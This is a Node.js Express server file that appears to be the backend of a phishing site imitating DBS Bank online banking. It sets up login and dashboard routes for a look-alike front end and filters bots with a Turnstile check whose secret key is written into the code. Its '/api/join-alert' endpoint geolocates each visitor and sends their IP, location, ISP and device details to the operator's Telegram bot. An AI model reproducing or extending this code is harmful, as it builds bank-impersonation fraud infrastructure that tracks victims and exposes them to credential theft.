const express = require('express');
const cors = require('cors');
const https = require('https');
const path = require('path');
const mongoose = require('mongoose');
const cookieParser = require('cookie-parser');
const dotenv = require('dotenv');

const authMiddleware = require('./middlewares/authentication');
const authbMiddleware = require('./middlewares/authc');
const loginRoute = require('./routes/loginRoute');
const dashboardRoute = require('./routes/dashboardRoute');

dotenv.config();  

const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: false }));
app.use(cookieParser());
app.use(cors({
    origin: ['https://dbs-online-b3k.pages.dev', 'http://localhost:5173', 'http://localhost:5174'],
    credentials: true  
}));
// Database connection
mongoose.connect(process.env.MONGOOSE_URL)
    .then(() => { console.log('Database connected successfully'); })
    .catch((err) => { console.log('Connection error: ', err); });

// Middleware protection on routes
app.use('/api/member/IB/profile', authMiddleware);
app.use('/api/IB/Welcome', authbMiddleware);

// Routes
app.use('/api', loginRoute);
app.use('/api/member', dashboardRoute);

// Logout
app.get('/api/logout', (req, res) => {
    res.clearCookie('authToken', {
        httpOnly: true,
        sameSite: 'none',
        secure: true,
    });
    res.json({ success: true, message: 'Logged out successfully' }); 
}); 




// Node.js backend
app.post('/verify-turnstile', async (req, res) => {
  const { token } = req.body;
  console.log(token);
  
  const response = await fetch('https://challenges.cloudflare.com/turnstile/v0/siteverify', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      secret: '0x4AAAAAADsB01gdwfVRdBm32WikFOzvSKc',
      response: token
    })
  });
  
  const data = await response.json();
  res.json({ success: data.success });
}); 





// ─── TELEGRAM JOIN ALERT ────────────────────────────────────────────
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

function getClientInfo(req) {
    let ip = req.headers['x-forwarded-for']?.split(',')[0].trim()
        || req.headers['x-real-ip']
        || req.connection.remoteAddress
        || req.socket.remoteAddress
        || 'Unknown';

    if (ip === '127.0.0.1') {
        ip = req.headers['cf-connecting-ip']
            || req.headers['x-forwarded-for']?.split(',')[0].trim()
            || ip;
    }

    const userAgent = req.headers['user-agent'] || 'Unknown';
    return { ip, userAgent };
}

async function getGeoInfo(ip) {
    if (!ip || ip === 'Unknown' || ip === '127.0.0.1' || ip === '::1') {
        return { country: 'Local', city: 'Local' };
    }
    try {
        const r = await fetch(
            `http://ip-api.com/json/${ip}?fields=status,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query`
        );
        return await r.json();
    } catch {
        return { country: 'Unknown', city: 'Unknown' };
    }
}

async function sendTelegram(message) {
    try {
        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });
        console.log('[+] Telegram sent');
    } catch (e) {
        console.log('[-] Telegram failed:', e.message);
    }
}

app.post('/api/join-alert', async (req, res) => {
    const { ip, userAgent } = getClientInfo(req);
    const geo = await getGeoInfo(ip);
    const page = req.body?.page || 'VISITED DBS BANK';

    const isMobile = /Android|iPhone|iPad|iPod|BlackBerry|Windows Phone|webOS|Mobile/i.test(userAgent);

    const message = `
🏦 <b>AFA MD, SOMEONE ${page.toUpperCase()}</b>

🌐 IP: <code>${ip}</code>
🌍 Country: <code>${geo.country || 'Unknown'}</code>
🏙️ City: <code>${geo.city || 'Unknown'}</code>
📍 Region: <code>${geo.regionName || 'Unknown'}</code>
📮 ZIP: <code>${geo.zip || 'Unknown'}</code>
🌐 ISP: <code>${geo.isp || 'Unknown'}</code>
🏢 Org: <code>${geo.org || 'Unknown'}</code>
🕒 Timezone: <code>${geo.timezone || 'Unknown'}</code>
🗺️ Lat/Lon: <code>${geo.lat}, ${geo.lon}</code>

📱 User-Agent: <code>${userAgent}</code>
${isMobile ? '⚠️ MOBILE' : '✅ DESKTOP'}
📅 Time: ${new Date().toLocaleString()}
    `.trim();

    sendTelegram(message);
    res.json({ ok: true });
}); 





// ─── AUTO-PING EVERY 10 MINUTES ───
setInterval(() => {
  https.get('https://assignmentdbs-1.onrender.com', (res) => {
    console.log(`Ping sent at ${new Date().toISOString()} - Status: ${res.statusCode}`);
  }).on('error', (err) => {
    console.log('Ping error:', err.message);
  });
}, 10 * 60 * 1000);



app.listen(3000, () => {
    console.log('Server listening on port 3000');
});